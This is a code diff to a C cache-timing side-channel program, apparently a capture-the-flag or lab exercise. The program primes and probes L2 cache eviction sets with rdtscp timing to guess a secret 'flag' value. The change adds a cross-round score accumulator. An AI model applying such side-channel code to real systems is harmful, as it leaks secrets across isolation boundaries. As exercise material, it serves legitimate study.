@@ -13,6 +13,8 @@
 
 #define REPEATS 3000
 
+static int persistent_scores[NUM_L2_CACHE_SETS] = {0};
+
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
 
@@ -106,7 +108,7 @@ int main() {
 
                 uint64_t latency = 0;
 
-                for(int r = 0; r < 2; r++) {
+                for(int probe = 0; probe < 2; probe++) {
                     uint64_t start = rdtscp();
 
                     for(int w = WAYS - 1; w >= 0; w--) {
@@ -118,22 +120,26 @@ int main() {
                 }
 
                 scores[set] += latency;
-            }
-        }
-        int best_set = 0;
-        uint64_t best_latency = 0;
 
-        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-
-            uint64_t avg = scores[set] / REPEATS;
-
-            if(avg > best_latency) {
-                best_latency = avg;
-                best_set = set;
+                
             }
         }
 
-        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
+        for(int s = 0; s < NUM_L2_CACHE_SETS; s++){
+                    persistent_scores[s] += scores[s];
+        }
+
+        int best_set = -1;
+        uint64_t best_score = 0;
+
+        for(int s = 0; s < NUM_L2_CACHE_SETS; s++){
+            if(persistent_scores[s] > best_score){
+            best_score = persistent_scores[s];
+            best_set = s;
+            }
+        }
+
+        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_score);
 
         wait_cycles(2000);
     }
